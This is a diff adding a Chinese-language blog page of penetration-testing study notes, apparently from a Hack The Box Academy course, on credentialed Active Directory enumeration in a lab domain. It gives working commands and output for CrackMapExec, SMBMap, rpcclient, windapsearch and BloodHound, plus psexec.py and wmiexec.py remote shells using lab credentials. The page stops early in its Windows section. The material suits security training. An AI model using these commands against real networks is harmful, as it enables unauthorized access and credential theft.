@@ -1,0 +1,306 @@
+<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>AD-3</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="
+Deeper Down the Rabbit Hole
+认证枚举
+
+
+Cooking with Fire
+
+
+
+Credentialed Enumeration - from LinuxCME - Domain User Enumeration我们首先将CME指向域控制器，并使用第二个用户的凭据来检索所有域用户的列表。请注意，当它向我们提供用户信息时，它包括诸如badPwdCount属性之类的数据点。这在执行有针对性的密码喷洒等操作时很有帮助。我们可以构建一个目标用户列表，过滤掉badPwdCount属性高于0的任何用户，以格外小心，不要锁定任何帐户。
+Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --us.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">AD-3</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Credentialed-Enumeration-from-Linux"><span class="toc-text">Credentialed Enumeration - from Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CME-Domain-User-Enumeration"><span class="toc-text">CME - Domain User Enumeration</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CME-Domain-Group-Enumeration"><span class="toc-text">CME - Domain Group Enumeration</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CME-Logged-On-Users"><span class="toc-text">CME - Logged On Users</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CME-Share-Searching"><span class="toc-text">CME Share Searching</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMBMap"><span class="toc-text">SMBMap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Recursive-List-Of-All-Directories"><span class="toc-text">Recursive List Of All Directories</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rpcclient"><span class="toc-text">rpcclient</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rpcclient-Enumeration"><span class="toc-text">rpcclient Enumeration</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RPCClient-User-Enumeration-By-RID"><span class="toc-text">RPCClient User Enumeration By RID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Enumdomusers"><span class="toc-text">Enumdomusers</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impacket-Toolkit"><span class="toc-text">Impacket Toolkit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Using-psexec-py"><span class="toc-text">Using psexec.py</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windapsearch"><span class="toc-text">Windapsearch</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windapsearch-Domain-Admins"><span class="toc-text">Windapsearch - Domain Admins</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windapsearch-Privileged-Users"><span class="toc-text">Windapsearch - Privileged Users</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bloodhound-py"><span class="toc-text">Bloodhound.py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Viewing-the-Results"><span class="toc-text">Viewing the Results</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Upload-the-Zip-File-into-the-BloodHound-GUI"><span class="toc-text">Upload the Zip File into the BloodHound GUI</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Credentialed-Enumeration-from-Windows"><span class="toc-text">-Credentialed Enumeration - from Windows-</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Discover-Modules"><span class="toc-text">Discover Modules</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Load-ActiveDirectory-Module"><span class="toc-text">Load ActiveDirectory Module</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-Domain-Info"><span class="toc-text">Get Domain Info</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Get-ADUser"><span class="toc-text">Get-ADUser</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Checking-For-Trust-Relationships"><span class="toc-text">Checking For Trust Relationships</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Group-Enumeration"><span class="toc-text">Group Enumeration</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Detailed-Group-Info"><span class="toc-text">Detailed Group Info</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Group-Membership"><span class="toc-text">Group Membership</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PowerView"><span class="toc-text">PowerView</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Domain-User-Information"><span class="toc-text">Domain User Information</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Recursive-Group-Membership"><span class="toc-text">Recursive Group Membership</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Trust-Enumeration"><span class="toc-text">Trust Enumeration</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Testing-for-Local-Admin-Access"><span class="toc-text">Testing for Local Admin Access</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Finding-Users-With-SPN-Set"><span class="toc-text">Finding Users With SPN Set</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SharpView"><span class="toc-text">SharpView</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shares"><span class="toc-text">Shares</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Snaffler"><span class="toc-text">Snaffler</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Snaffler-Execution"><span class="toc-text">Snaffler Execution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound"><span class="toc-text">BloodHound</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SharpHound-in-Action"><span class="toc-text">SharpHound in Action</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/base"><i class="tag post-item-tag">base</i></a><a href="/tags/AD"><i class="tag post-item-tag">AD</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">AD-3</h1><time class="has-text-grey" datetime="2023-10-02T07:39:28.000Z">2023-10-02</time><article class="mt-2 post-content"><ul>
+<li>Deeper Down the Rabbit Hole<ul>
+<li>认证枚举</li>
+</ul>
+</li>
+<li>Cooking with Fire</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="Credentialed-Enumeration-from-Linux"><a href="#Credentialed-Enumeration-from-Linux" class="headerlink" title="Credentialed Enumeration - from Linux"></a>Credentialed Enumeration - from Linux</h1><h4 id="CME-Domain-User-Enumeration"><a href="#CME-Domain-User-Enumeration" class="headerlink" title="CME - Domain User Enumeration"></a>CME - Domain User Enumeration</h4><p>我们首先将CME指向域控制器，并使用第二个用户的凭据来检索所有域用户的列表。请注意，当它向我们提供用户信息时，它包括诸如badPwdCount属性之类的数据点。这在执行有针对性的密码喷洒等操作时很有帮助。我们可以构建一个目标用户列表，过滤掉badPwdCount属性高于0的任何用户，以格外小心，不要锁定任何帐户。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395
+
+&lt;SNIP&gt;
+</code></pre>
+<p>我们还可以获得域组的完整列表。我们应该将所有输出保存到文件中，以便以后再次轻松访问，以便进行报告或与其他工具一起使用。</p>
+<h4 id="CME-Domain-Group-Enumeration"><a href="#CME-Domain-Group-Enumeration" class="headerlink" title="CME - Domain Group Enumeration"></a>CME - Domain Group Enumeration</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0
+
+&lt;SNIP&gt;
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0
+
+&lt;SNIP&gt;
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36
+
+&lt;SNIP&gt;
+</code></pre>
+<p>上面的代码段列出了域中的组以及每个组中的用户数。输出还显示域控制器上的内置组，例如Backup Operators。我们可以开始记下感兴趣的群体。请注意关键组，如管理员、域管理员、行政人员，以及可能包含特权IT管理员的任何组等。这些组可能包含具有提升权限的用户，值得在我们的评估中作为目标。</p>
+<h4 id="CME-Logged-On-Users"><a href="#CME-Logged-On-Users" class="headerlink" title="CME - Logged On Users"></a>CME - Logged On Users</h4><p>我们也可以使用CME来瞄准其他主机。让我们检查一下似乎是文件服务器的内容，看看当前登录了哪些用户。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
+SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01
+
+&lt;SNIP&gt;
+</code></pre>
+<p>我们看到许多用户登录到这个服务器，这非常有趣。我们还可以看到，我们的用户forend是本地管理员，因为（Pwn3d！）出现在工具成功验证到目标主机之后。像这样的主机可以被管理用户用作跳转主机或类似的主机。我们可以看到用户wley已经登录，我们之前将其标识为域管理员。如果我们可以从内存中窃取或模拟该用户的凭据，这可能是一场轻松的胜利。 正如我们稍后将看到的，BloodHound（以及PowerView等其他工具）可以用于查找用户会话。BloodHound功能特别强大，因为我们可以使用它以多种方式以图形方式快速查看域用户会话。无论如何，像CME这样的工具非常适合更有针对性的枚举和用户搜索。</p>
+<h4 id="CME-Share-Searching"><a href="#CME-Share-Searching" class="headerlink" title="CME Share Searching"></a>CME Share Searching</h4><p>我们看到有几个共享可供我们使用READ访问。Department Shares<code>, </code>User Shares和ZZZ_archive共享值得进一步挖掘，因为它们可能包含密码或PII等敏感数据。接下来，我们可以深入挖掘共享，并在每个目录中搜寻文件。spider_plus模块将挖掘主机上的每个可读共享，并列出所有可读文件。让我们试一试。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share &#39;Department Shares&#39;
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:
+SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        DIR: [&#39;print$&#39;]
+SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]        EXT: [&#39;ico&#39;, &#39;lnk&#39;]
+SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]       SIZE: 51200
+SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus
+</code></pre>
+<p>在上面的命令中，我们对Department Shares运行了spider。完成后，CME将结果写入位于&#x2F;tmp&#x2F;CME_spider_plus&#x2F;<ip-of-host>的JSON文件。下面我们可以看到JSON输出的一部分。我们可以四处寻找有趣的文件，例如web.config文件或可能包含密码的脚本。如果我们想进一步挖掘，我们可以提取这些文件来查看其中包含的内容，也许可以找到一些硬编码的凭据或其他敏感信息。</p>
+<p>这只是对其能力的一个微小的观察；值得对实验室目标进行更多的实验。在本模块的剩余部分中，我们将以各种方式利用CME。让我们继续看SMBMap。</p>
+<h2 id="SMBMap"><a href="#SMBMap" class="headerlink" title="SMBMap"></a>SMBMap</h2><p>SMBMap非常适合从Linux攻击主机枚举SMB共享。它可用于收集共享、权限和共享内容的列表（如果可以访问）。一旦获得访问权限，就可以用来下载和上传文件以及执行远程命令。 与CME一样，我们可以使用SMBMap和一组域用户凭据来检查远程系统上的可访问共享</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+
+[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
+        Disk                                                  	Permissions	Comment
+    ----                                                  	-----------	-------
+    ADMIN$                                            	NO ACCESS	Remote Admin
+    C$                                                	NO ACCESS	Default share
+    Department Shares                                 	READ ONLY	
+    IPC$                                              	READ ONLY	Remote IPC
+    NETLOGON                                          	READ ONLY	Logon server share 
+    SYSVOL                                            	READ ONLY	Logon server share 
+    User Shares                                       	READ ONLY	
+    ZZZ_archive                                       	READ ONLY
+</code></pre>
+<p>以上内容将告诉我们我们的用户可以访问什么以及他们的权限级别。与CME的结果一样，我们看到用户forend无法通过ADMIN$或C$共享访问DC（这是标准用户帐户所期望的），但可以通过IPC$、NETLOGON和SYSVOL进行读取访问，这是任何域中的默认访问权限。其他非标准共享，如部门共享以及用户和归档共享，是最有趣的。让我们递归地列出Department Shares共享中的目录。正如预期的那样，我们可以看到公司中每个部门的子目录。</p>
+<h4 id="Recursive-List-Of-All-Directories"><a href="#Recursive-List-Of-All-Directories" class="headerlink" title="Recursive List Of All Directories"></a>Recursive List Of All Directories</h4><pre><code class="shell-session">Tanin@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R &#39;Department Shares&#39; --dir-only
+
+[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
+        Disk                                                  	Permissions	Comment
+    ----                                                  	-----------	-------
+    Department Shares                                 	READ ONLY	
+    .\Department Shares\*
+    dr--r--r--                0 Thu Mar 31 15:34:29 2022	.
+    dr--r--r--                0 Thu Mar 31 15:34:29 2022	..
+    dr--r--r--                0 Thu Mar 31 15:14:48 2022	Accounting
+    dr--r--r--                0 Thu Mar 31 15:14:39 2022	Executives
+    dr--r--r--                0 Thu Mar 31 15:14:57 2022	Finance
+    dr--r--r--                0 Thu Mar 31 15:15:04 2022	HR
+    dr--r--r--                0 Thu Mar 31 15:15:21 2022	IT
+    dr--r--r--                0 Thu Mar 31 15:15:29 2022	Legal
+    dr--r--r--                0 Thu Mar 31 15:15:37 2022	Marketing
+    dr--r--r--                0 Thu Mar 31 15:15:47 2022	Operations
+    dr--r--r--                0 Thu Mar 31 15:15:58 2022	R&amp;D
+    dr--r--r--                0 Thu Mar 31 15:16:10 2022	Temp
+    dr--r--r--                0 Thu Mar 31 15:16:18 2022	Warehouse
+
+    &lt;SNIP&gt;
+</code></pre>
+<h2 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h2><pre><code class="bash">rpcclient -U &quot;&quot; -N 172.16.5.5
+</code></pre>
+<h4 id="rpcclient-Enumeration"><a href="#rpcclient-Enumeration" class="headerlink" title="rpcclient Enumeration"></a>rpcclient Enumeration</h4><p>在rpcclient中查看用户时，您可能会注意到每个用户旁边都有一个名为rid:的字段。相对标识符（RID）是Windows用来跟踪和识别对象的唯一标识符（以十六进制格式表示）</p>
+<h4 id="RPCClient-User-Enumeration-By-RID"><a href="#RPCClient-User-Enumeration-By-RID" class="headerlink" title="RPCClient User Enumeration By RID"></a>RPCClient User Enumeration By RID</h4><pre><code class="shell-session">rpcclient $&gt; queryuser 0x457
+
+        User Name   :   htb-student
+        Full Name   :   Htb Student
+        Home Drive  :
+        Dir Drive   :
+        Profile Path:
+        Logon Script:
+        Description :
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST
+        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
+        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
+        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT
+        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT
+        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
+        unknown_2[0..31]...
+        user_rid :      0x457
+        group_rid:      0x201
+        acb_info :      0x00000010
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x0000001d
+        padding1[0..7]...
+        logon_hrs[0..21]...
+</code></pre>
+<h4 id="Enumdomusers"><a href="#Enumdomusers" class="headerlink" title="Enumdomusers"></a>Enumdomusers</h4><pre><code class="shell-session">rpcclient $&gt; enumdomusers
+
+user:[administrator] rid:[0x1f4]
+user:[guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[lab_adm] rid:[0x3e9]
+user:[htb-student] rid:[0x457]
+user:[avazquez] rid:[0x458]
+user:[pfalcon] rid:[0x459]
+user:[fanthony] rid:[0x45a]
+user:[wdillard] rid:[0x45b]
+user:[lbradford] rid:[0x45c]
+user:[sgage] rid:[0x45d]
+user:[asanchez] rid:[0x45e]
+user:[dbranch] rid:[0x45f]
+user:[ccruz] rid:[0x460]
+user:[njohnson] rid:[0x461]
+user:[mholliday] rid:[0x462]
+
+&lt;SNIP&gt;  
+</code></pre>
+<h2 id="Impacket-Toolkit"><a href="#Impacket-Toolkit" class="headerlink" title="Impacket Toolkit"></a>Impacket Toolkit</h2><p> <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">psexec.py</a></p>
+<p>Impacket套件中最有用的工具之一是psexec.py。psexec.py是Sysinternals psexec可执行文件的克隆，但工作方式与原始文件略有不同。该工具通过将随机命名的可执行文件上载到目标主机上的ADMIN$共享来创建远程服务。然后，它通过RPC和Windows服务控制管理器注册服务。一旦建立，通信就通过命名管道进行，作为SYSTEM在受害者主机上提供一个交互式远程shell。</p>
+<h4 id="Using-psexec-py"><a href="#Using-psexec-py" class="headerlink" title="Using psexec.py"></a>Using psexec.py</h4><pre><code class="bash">psexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.125  
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a></p>
+<p>Wmiexec.py利用了一个半交互式shell，通过Windows Management Instrumentation执行命令。它不会在目标主机上丢弃任何文件或可执行文件，并且生成的日志比其他模块少。连接后，它以我们连接的本地管理员用户的身份运行（对于寻找入侵的人来说，这可能比看到SYSTEM执行许多命令更不明显）。与其他工具相比，这是一种在主机上更隐蔽的执行方法，但仍可能被大多数现代反病毒和EDR系统所捕获。我们将使用与psexec.py相同的帐户来访问主机。</p>
+<pre><code class="bash">wmiexec.py inlanefreight.local/wley:&#39;transporter@4&#39;@172.16.5.5  
+</code></pre>
+<p>请注意，此shell环境不是完全交互式的，因此发出的每个命令都将从WMI执行一个新的cmd.exe并执行您的命令。这样做的缺点是，如果警惕的防御者检查事件日志并查看事件ID 4688：已经创建了一个新进程，他们将看到一个创建的新进程来生成cmd.exe并发出命令。</p>
+<h2 id="Windapsearch"><a href="#Windapsearch" class="headerlink" title="Windapsearch"></a>Windapsearch</h2><p><a target="_blank" rel="noopener" href="https://github.com/ropnop/windapsearch">Windapsearch</a>是另一个方便的Python脚本，我们可以使用LDAP查询从Windows域中枚举用户、组和计算机。</p>
+<p>我们使用Windapsearch有几个选项来执行标准枚举（转储用户、计算机和组）和更详细的枚举。–da（枚举域管理员组成员）选项和-PU（查找特权用户）选项。-PU选项很有趣，因为它将对具有嵌套组成员身份的用户执行递归搜索。</p>
+<h4 id="Windapsearch-Domain-Admins"><a href="#Windapsearch-Domain-Admins" class="headerlink" title="Windapsearch - Domain Admins"></a>Windapsearch - Domain Admins</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+</code></pre>
+<p>为了识别更多的潜在用户，我们可以使用-PU标志运行该工具，并检查是否有可能未被注意到的特权提升的用户。这是一个很好的报告检查，因为它很可能会通知客户具有嵌套组成员资格的多余权限的用户。</p>
+<h4 id="Windapsearch-Privileged-Users"><a href="#Windapsearch-Privileged-Users" class="headerlink" title="Windapsearch - Privileged Users"></a>Windapsearch - Privileged Users</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+</code></pre>
+<pre><code class="shell-session">&lt;SNIP&gt;
+
+[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]     Found 3 nested users for group Enterprise Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Sharepoint Admin
+userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL
+
+&lt;SNIP&gt;
+</code></pre>
+<h2 id="Bloodhound-py"><a href="#Bloodhound-py" class="headerlink" title="Bloodhound.py"></a>Bloodhound.py</h2><p>BloodHound是有史以来发布的用于审计Active Directory安全性的最具影响力的工具之一，它对我们作为渗透测试人员来说非常有益。我们可以获取大量耗时的数据，以筛选和创建图形表示或特定用户访问可能导致的“攻击路径”。</p>
+<p>该工具从AD收集数据，如用户、组、计算机、组成员资格、GPO、ACL、域信任、本地管理员访问、用户会话、计算机和用户属性、RDP访问、WinRM访问等。 它最初只与PowerShell收集器一起发布，因此必须从Windows主机上运行。最终，一个社区成员发布了一个Python端口（需要Impacket、ldap3和dnspython）。当我们有有效的域凭据，但没有访问加入域的Windows主机的权限，或者没有运行SharpHound收集器的Windows攻击主机时，这在渗透测试中帮助很大。这也有助于我们不必从域主机运行收集器，因为域主机可能会被阻止或引发警报（尽管在保护良好的环境中，即使从攻击主机运行收集器也很可能引发警报）。</p>
+<p>该工具接受带有-c或–collectionmethod标志的各种收集方法。我们可以检索特定的数据，如用户会话、用户和组、对象属性、ACLS，或者全选以收集尽可能多的数据。（ user sessions, users and groups, object properties, ACLS,）</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sudo bloodhound-python -u &#39;forend&#39; -p &#39;Klmcargo2&#39; -ns 172.16.5.5 -d inlanefreight.local -c all 
+
+INFO: Found AD domain: inlanefreight.local
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 1 domains
+INFO: Found 2 domains in the forest
+INFO: Found 564 computers
+INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 2951 users
+INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+INFO: Found 183 groups
+INFO: Found 2 trusts
+INFO: Starting computer enumeration with 10 workers
+
+&lt;SNIP&gt;
+</code></pre>
+<h4 id="Viewing-the-Results"><a href="#Viewing-the-Results" class="headerlink" title="Viewing the Results"></a>Viewing the Results</h4><h4 id="Upload-the-Zip-File-into-the-BloodHound-GUI"><a href="#Upload-the-Zip-File-into-the-BloodHound-GUI" class="headerlink" title="Upload the Zip File into the BloodHound GUI"></a>Upload the Zip File into the BloodHound GUI</h4><p>然后，我们可以键入sudo neo4j start来启动<a target="_blank" rel="noopener" href="https://neo4j.com/">neo4j</a>服务，启动我们将加载数据的数据库，并对其运行Cypher查询。</p>
+<p> <a target="_blank" rel="noopener" href="https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/">custom Cypher queries</a></p>
+<h1 id="Credentialed-Enumeration-from-Windows"><a href="#Credentialed-Enumeration-from-Windows" class="headerlink" title="-Credentialed Enumeration - from Windows-"></a>-Credentialed Enumeration - from Windows-</h1><h4 id="Discover-Modules"><a href="#Discover-Modules" class="headerlink" title="Discover Modules"></a>Discover Modules</h4><pre><code class="powershell-session">PS C:\htb&gt; Get-Module
+
+ModuleType Version    Name                                ExportedCommands
+---------- -------    ----                                ----------------
+Manifest   3.1.0.0    Microsoft.PowerShell.Utility        &#123;Add-Member, Add-Type, Clear-Variable, Compare-Object...&#125;
+Script     2.0.0      PSReadline                          &#123;Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
+</code></pre>
+<h4 id="Load-ActiveDirectory-Module"><a href="#Load-ActiveDirectory-Module" class="headerlink" title="Load ActiveDirectory Module"></a>Load ActiveDirectory Module</h4><pre><code class="powershell-session">PS C:\htb&gt; Import-Module ActiveDirectory
+PS C:\htb&gt; Get-Module
+</code></pre>
